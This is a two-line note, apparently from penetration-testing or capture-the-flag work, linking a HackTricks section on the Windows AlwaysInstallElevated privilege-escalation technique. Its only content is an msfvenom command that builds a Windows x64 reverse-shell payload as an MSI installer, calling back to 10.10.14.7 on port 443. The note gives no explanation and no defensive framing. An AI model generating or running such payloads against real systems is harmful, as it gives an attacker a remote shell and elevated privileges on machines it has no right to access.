_____

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated

```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
```
